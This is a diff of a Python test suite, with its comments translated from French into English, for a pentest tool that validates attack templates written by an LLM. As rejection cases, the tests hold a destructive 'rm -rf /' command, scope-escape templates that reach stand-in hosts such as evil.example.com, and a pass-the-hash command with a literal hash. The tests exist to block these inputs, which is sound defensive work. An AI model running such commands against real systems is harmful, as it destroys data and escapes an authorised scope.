@@ -12,7 +12,7 @@ _BAD = json.dumps({"id":"llm.bad","service":"smb","tool":"sh",
     "command_template":"rm -rf / ; curl {target}"})
 
 def test_author_returns_tagged_technique():
-    t = author.author_technique("smb", "contexte", llm_invoke=lambda p: _GOOD)
+    t = author.author_technique("smb", "context", llm_invoke=lambda p: _GOOD)
     assert t is not None and t.provided_by == "llm" and t.service == "smb"
     assert t.opens_session is True and "credential" in t.requires
 
@@ -20,7 +20,7 @@ def test_author_rejects_destructive_or_shell_template():
     assert author.author_technique("smb", "ctx", llm_invoke=lambda p: _BAD) is None
 
 def test_author_rejects_unparseable_output():
-    assert author.author_technique("smb", "ctx", llm_invoke=lambda p: "désolé je ne peux pas") is None
+    assert author.author_technique("smb", "ctx", llm_invoke=lambda p: "sorry, I cannot") is None
 
 def test_persist_roundtrips_through_loader(tmp_path):
     from state import mission_io
@@ -45,16 +45,16 @@ def test_author_forces_provided_by_and_service():
     assert t is not None and t.provided_by == "llm" and t.service == "smb"
 
 
-def test_build_author_prompt_encadre_le_contexte_et_consigne_les_echecs():
-    p = author.build_author_prompt("smb", "ÉTAT-RÉEL-XYZ")
-    assert "ÉTAT-RÉEL-XYZ" in p            # le contexte réel est injecté
-    assert "déjà" in p.lower()              # consigne : ne pas reproposer ce qui a été tenté
-    assert "UN objet JSON" in p             # format de sortie conservé
+def test_build_author_prompt_frames_context_and_instructs_about_failures():
+    p = author.build_author_prompt("smb", "REAL-STATE-XYZ")
+    assert "REAL-STATE-XYZ" in p           # the real context is injected
+    assert "already" in p.lower()          # instruction: do not re-propose what was attempted
+    assert "ONE JSON object" in p          # output format preserved
 
 
-def test_build_author_prompt_annonce_tous_les_champs_remplissables():
-    # Le rendu sait remplir {port} et {password} : l'auteur doit le savoir, sinon il
-    # met un mot de passe dans {hash} et ne peut pas viser un port non standard.
+def test_build_author_prompt_announces_all_fillable_fields():
+    # Rendering can fill {port} and {password}: the author must know it, otherwise it
+    # puts a password in {hash} and cannot target a non-standard port.
     p = author.build_author_prompt("smb", "ctx")
     for field in ("{target}", "{port}", "{user}", "{password}", "{hash}", "{domain}", "{share}"):
         assert field in p, field
@@ -67,15 +67,15 @@ class _FakeStore:
         self.calls.append((list(texts), metadatas, ids))
 
 
-def test_promote_techniques_to_rag_add_texts_et_ids_stables():
+def test_promote_techniques_to_rag_add_texts_and_stable_ids():
     t = author.author_technique("smb", "ctx", llm_invoke=lambda p: _GOOD)
     s = _FakeStore()
     assert author.promote_techniques_to_rag([t], "mission-1", store=s) == 1
     texts, metas, ids = s.calls[0]
-    assert "crackmapexec smb {target}" in texts[0]        # gabarit décrit, placeholders intacts
+    assert "crackmapexec smb {target}" in texts[0]        # template described, placeholders intact
     assert metas[0]["source"] == "llm_authored" and metas[0]["service"] == "smb"
     assert metas[0]["technique_id"] == "llm.smb.cme"
-    # idempotence inter-missions : même contenu -> même id (upsert, pas de doublon)
+    # cross-mission idempotence: same content -> same id (upsert, no duplicate)
     author.promote_techniques_to_rag([t], "mission-2", store=s)
     assert s.calls[1][2] == ids
 
@@ -89,28 +89,28 @@ def test_author_accepts_the_well_typed_baseline():
 
 
 @pytest.mark.parametrize("bad", [
-    {"command_template": ["echo", "{target}"]},   # liste : faisait lever author_technique
-    {"id": {"a": 1}},                              # non hachable : empoisonnait le catalogue de mission
+    {"command_template": ["echo", "{target}"]},   # list: used to make author_technique raise
+    {"id": {"a": 1}},                              # unhashable: used to poison the mission catalog
     {"id": ["a"]},
     {"id": ""},
-    {"id": "../../ailleurs"},
+    {"id": "../../elsewhere"},
     {"tool": ["echo"]},
     {"name": {"x": 1}},
     {"success_signal": ["ok"]},
     {"requires": [1, 2]},
     {"requires": {"session": True}},
-    {"opens_session": "oui"},
+    {"opens_session": "yes"},
 ])
 def test_author_rejects_ill_typed_fields(bad):
-    # Une proposition mal typée est REJETÉE (None) — jamais d'exception qui
-    # interromprait la mission, jamais d'entrée inutilisable dans le catalogue.
+    # An ill-typed proposal is REJECTED (None) — never an exception that
+    # would interrupt the mission, never an unusable entry in the catalog.
     raw = json.dumps({**_BASE, **bad})
     assert author.author_technique("http", "ctx", llm_invoke=lambda p: raw) is None
 
 
 def test_author_survives_a_failing_llm_call():
     def down(_prompt):
-        raise ConnectionError("API indisponible")
+        raise ConnectionError("API unavailable")
     assert author.author_technique("http", "ctx", llm_invoke=down) is None
 
 
@@ -122,8 +122,8 @@ def _tech(**over):
 
 
 def test_promote_isolates_a_malformed_technique():
-    # Une technique illisible est écartée seule : elle ne fait plus lever, ni
-    # perdre tout le lot.
+    # An unreadable technique is discarded on its own: it no longer raises, nor
+    # loses the whole batch.
     s = _FakeStore()
     assert author.promote_techniques_to_rag([_tech(command_template=None), _tech()], "m", store=s) == 1
     assert len(s.calls[0][0]) == 1
@@ -137,23 +137,23 @@ def test_promote_dedupes_identical_templates_in_one_batch():
 
 def test_rag_candidates_expose_exactly_what_would_be_stored():
     cands = author.rag_candidates([_tech(), _tech(command_template="nmap -p 445 192.0.2.10")])
-    assert len(cands) == 1                                   # l'IP littérale écarte la seconde
-    assert cands[0]["text"].startswith("Technique « x » pour le service smb")
+    assert len(cands) == 1                                   # the literal IP discards the second one
+    assert cands[0]["text"].startswith("Technique \"x\" for the smb service")
     assert cands[0]["id"].startswith("llm:") and cands[0]["metadata"]["tool"] == "nmap"
     s = _FakeStore()
     assert author.store_candidates(cands, store=s) == 1 and s.calls[0][0] == [cands[0]["text"]]
 
 
-def test_promote_techniques_to_rag_vide_est_noop():
+def test_promote_techniques_to_rag_empty_is_noop():
     class Boom:
         def add_texts(self, *a, **k):
-            raise AssertionError("ne doit pas écrire pour une liste vide")
+            raise AssertionError("must not write for an empty list")
     assert author.promote_techniques_to_rag([], "m", store=Boom()) == 0
 
 
 def test_promote_skips_template_with_ip_literal():
-    # IP littérale dans le gabarit = spécifique à la mission -> jamais dans le RAG partagé.
-    # Technique construite directement : author_technique la rejetterait désormais en amont.
+    # Literal IP in the template = mission-specific -> never in the shared RAG.
+    # Technique built directly: author_technique would now reject it upstream.
     from catalog.loader import Technique
     t = Technique(id="llm.smb.x", name="x", domain="ad", service="smb", requires=set(),
                   tool="crackmapexec", command_template="crackmapexec smb 10.0.0.5 -u admin",
@@ -178,23 +178,23 @@ def test_promote_metadata_omits_target_mission_id():
     s = _FakeStore()
     author.promote_techniques_to_rag([t], "10.0.0.5-20261116-120000", store=s)
     meta = s.calls[0][1][0]
-    assert "mission_id" not in meta            # champ retiré
-    assert "10.0.0.5" not in str(meta)         # aucune IP cible en metadata
+    assert "mission_id" not in meta            # field removed
+    assert "10.0.0.5" not in str(meta)         # no target IP in metadata
 
 
 def test_promote_skips_unknown_nt_hash_literal():
-    # hash NT inconnu (non reconcilié) inliné par le LLM -> rejeté (entropie + flag)
+    # unknown NT hash (not reconciled) inlined by the LLM -> rejected (entropy + flag)
     raw = json.dumps({"id": "llm.smb.h", "name": "pth", "service": "smb", "tool": "impacket-wmiexec",
                       "command_template": "impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 {user}@{target}",
                       "success_signal": "ok"})
     t = author.author_technique("smb", "ctx", llm_invoke=lambda p: raw)
     s = _FakeStore()
-    assert author.promote_techniques_to_rag([t], "m1", store=s) == 0   # forbidden vide
+    assert author.promote_techniques_to_rag([t], "m1", store=s) == 0   # forbidden empty
     assert s.calls == []
 
 
 def test_promote_skips_literal_credential_flag_value():
-    # secret inconnu, basse entropie, en position de flag credential -> contrôle structurel
+    # unknown secret, low entropy, in a credential flag position -> structural check
     raw = json.dumps({"id": "llm.smb.p", "name": "brute", "service": "smb", "tool": "crackmapexec",
                       "command_template": "crackmapexec smb {target} -u {user} -p hunter2", "success_signal": "ok"})
     t = author.author_technique("smb", "ctx", llm_invoke=lambda p: raw)
@@ -204,7 +204,7 @@ def test_promote_skips_literal_credential_flag_value():
 
 
 def test_promote_scans_all_persisted_fields_not_subset():
-    # IP dans `tool` (champ persisté hors des 4 scannés initialement) -> rejeté
+    # IP in `tool` (persisted field outside the 4 initially scanned) -> rejected
     raw = json.dumps({"id": "llm.smb.t", "name": "x", "service": "smb", "tool": "scanner-10.0.0.5",
                       "command_template": "run {target}", "success_signal": "ok"})
     t = author.author_technique("smb", "ctx", llm_invoke=lambda p: raw)
@@ -214,7 +214,7 @@ def test_promote_scans_all_persisted_fields_not_subset():
 
 
 def test_promote_skips_compressed_ipv6_literal():
-    # IPv6 littérale dans le gabarit -> jamais promue (construite directement : rejetée à l'authoring).
+    # Literal IPv6 in the template -> never promoted (built directly: rejected at authoring).
     from catalog.loader import Technique
     t = Technique(id="llm.x.6", name="x", domain="ad", service="smb", requires=set(),
                   tool="nmap", command_template="nmap -6 fe80::1", success_signal="ok",
@@ -225,7 +225,7 @@ def test_promote_skips_compressed_ipv6_literal():
 
 
 def test_promote_allows_timestamp_in_success_signal():
-    # régression du faux positif IPv6-ish : HH:MM:SS ne doit PAS bloquer la promotion
+    # regression of the IPv6-ish false positive: HH:MM:SS must NOT block promotion
     raw = json.dumps({"id": "llm.ok.ts", "name": "x", "service": "smb", "tool": "crackmapexec",
                       "command_template": "crackmapexec smb {target} -u {user}", "success_signal": "session at 10:30:00"})
     t = author.author_technique("smb", "ctx", llm_invoke=lambda p: raw)
@@ -234,7 +234,7 @@ def test_promote_allows_timestamp_in_success_signal():
 
 
 def test_promote_allows_literal_numeric_port():
-    # un port littéral après -p n'est PAS un credential -> promu (fin du faux positif)
+    # a literal port after -p is NOT a credential -> promoted (end of the false positive)
     raw = json.dumps({"id": "llm.np", "name": "scan", "service": "smb", "tool": "nmap",
                       "command_template": "nmap -p 445 {target}", "success_signal": "open"})
     t = author.author_technique("smb", "ctx", llm_invoke=lambda p: raw)
@@ -243,7 +243,7 @@ def test_promote_allows_literal_numeric_port():
 
 
 def test_promote_allows_header_flag():
-    # -H = en-tête HTTP (curl), pas un hash -> promu ; un vrai hash reste capté par l'entropie
+    # -H = HTTP header (curl), not a hash -> promoted; a real hash is still caught by entropy
     raw = json.dumps({"id": "llm.hd", "name": "get", "service": "http", "tool": "curl",
                       "command_template": 'curl -H "Content-Type: application/json" {target}', "success_signal": "200"})
     t = author.author_technique("http", "ctx", llm_invoke=lambda p: raw)
@@ -252,7 +252,7 @@ def test_promote_allows_header_flag():
 
 
 def test_promote_skips_short_base64_key_in_noncommand_field():
-    # clé base64 ~22 car. dans success_signal (hors flag/commande) -> captée par entropie (seuil 20)
+    # ~22-char base64 key in success_signal (outside flag/command) -> caught by entropy (threshold 20)
     raw = json.dumps({"id": "llm.k", "name": "x", "service": "smb", "tool": "run",
                       "command_template": "run {target}", "success_signal": "key ABCDEFGHIJKLMNOPQRSTUV"})
     t = author.author_technique("smb", "ctx", llm_invoke=lambda p: raw)
@@ -262,7 +262,7 @@ def test_promote_skips_short_base64_key_in_noncommand_field():
 
 
 def test_promote_skips_short_H_hash_via_entropy():
-    # garde : -H retiré du contrôle structurel, mais un vrai hash reste rejeté par l'entropie
+    # guard: -H removed from the structural check, but a real hash is still rejected by entropy
     raw = json.dumps({"id": "llm.hh", "name": "pth", "service": "smb", "tool": "cme",
                       "command_template": "cme smb {target} -H 31d6cfe0d16ae931b73c59d7e0c089c0", "success_signal": "ok"})
     t = author.author_technique("smb", "ctx", llm_invoke=lambda p: raw)
@@ -270,9 +270,9 @@ def test_promote_skips_short_H_hash_via_entropy():
     assert author.promote_techniques_to_rag([t], "m1", store=s) == 0
 
 
-# --- Authoring : le gabarit DOIT cibler {target} et ne porter aucun hôte/IP littéral --- #
+# --- Authoring: the template MUST target {target} and carry no literal host/IP --- #
 def test_author_rejects_template_without_target():
-    # Pas de {target} -> la cible n'est pas garantie in-scope -> rejet.
+    # No {target} -> the target is not guaranteed in scope -> rejected.
     raw = json.dumps({"id": "llm.x", "service": "smb", "tool": "nmap",
                       "command_template": "nmap -sV -p 445"})
     assert author.author_technique("smb", "ctx", llm_invoke=lambda p: raw) is None
@@ -285,7 +285,7 @@ def test_author_rejects_literal_ip():
 
 
 def test_author_rejects_literal_host_even_with_target():
-    # {target} présent mais un SECOND hôte littéral (proxy) -> rejet (évasion de périmètre).
+    # {target} present but a SECOND literal host (proxy) -> rejected (scope escape).
     raw = json.dumps({"id": "llm.x", "service": "http", "tool": "curl",
                       "command_template": "curl http://{target}/ -x http://evil.example.com:8080"})
     assert author.author_technique("http", "ctx", llm_invoke=lambda p: raw) is None
@@ -299,7 +299,7 @@ def test_author_accepts_templated_target():
 
 
 def test_author_accepts_rate_flag():
-    # un grand entier (débit) n'est pas un hôte littéral -> scan rapide autorisé (fin du FP débit).
+    # a large integer (rate) is not a literal host -> fast scan allowed (end of the rate FP).
     raw = json.dumps({"id": "llm.ms", "service": "smb", "tool": "masscan",
                       "command_template": "masscan {target} --rate 100000 -p445", "success_signal": "open"})
     t = author.author_technique("smb", "ctx", llm_invoke=lambda p: raw)
@@ -307,10 +307,10 @@ def test_author_accepts_rate_flag():
 
 
 def test_author_rejects_placeholder_glued_to_literal_host():
-    # Évasion de périmètre (re-review 17/11) : {target} collé à un domaine attaquant.
-    # host_literals() seul ne le voit pas (les accolades cassent la classification), mais
-    # au rendu l'hôte '10.0.0.5.evil.com' NAÎT et échappe aux deux couches. Rejet par
-    # substitution sentinelle du gabarit à l'authoring (chemin LLM non fiable).
+    # Scope escape (re-review 11/17): {target} glued to an attacker domain.
+    # host_literals() alone does not see it (the braces break classification), but
+    # at render time the host '10.0.0.5.evil.com' APPEARS and escapes both layers. Rejected by
+    # sentinel substitution of the template at authoring (untrusted LLM path).
     for tpl in ["curl http://{target}.evil.com/",
                 "nmap -sV {target}.evil.example.com",
                 "curl http://{target}@localhost/"]:
@@ -320,8 +320,8 @@ def test_author_rejects_placeholder_glued_to_literal_host():
 
 
 def test_author_accepts_legit_placeholder_templates():
-    # Non-régression : les gabarits normaux (placeholder en position d'hôte, port, chemin,
-    # fichier de sortie) ne déclenchent PAS la détection de collage.
+    # Non-regression: normal templates (placeholder in host position, port, path,
+    # output file) do NOT trigger the gluing detection.
     for tpl in ["crackmapexec smb {target} -u {user} -H {hash}",
                 "curl http://{target}:{port}/{path}",
                 "smbclient //{target}/{share} -U {user}",
@@ -332,9 +332,9 @@ def test_author_accepts_legit_placeholder_templates():
 
 
 def test_author_rejects_non_target_placeholder_in_host_position():
-    # Round 2 : seul {target} est sanctionné in-scope. Un AUTRE placeholder en position
-    # d'hôte (ou {target} collé à un autre) se matérialise hors périmètre au rendu
-    # (corp.local via creds) -> rejet à l'authoring LLM (invariant {target} par position).
+    # Round 2: only {target} is sanctioned in scope. ANOTHER placeholder in host
+    # position (or {target} glued to another) materializes out of scope at render time
+    # (corp.local via creds) -> rejected at LLM authoring ({target}-by-position invariant).
     for tpl in ["curl http://{domain}/ {target}",
                 "curl -x http://{domain}:{port} {target}",
                 "ssh {user}@{domain} {target}",
@@ -346,8 +346,8 @@ def test_author_rejects_non_target_placeholder_in_host_position():
 
 
 def test_author_accepts_capture_and_identity_templates():
-    # Régression B2 corrigée : gabarits légitimes de capture/sortie et identités AD
-    # (UPN/NetBIOS, domaine en argument -d) ne doivent PLUS être rejetés.
+    # B2 regression fixed: legitimate capture/output templates and AD identities
+    # (UPN/NetBIOS, domain as a -d argument) must NO LONGER be rejected.
     for tpl in ["tcpdump -w {output}.pcap host {target}",
                 "tshark -w {capture}.cap host {target}",
                 "nmap {target} -oA {output}.report",
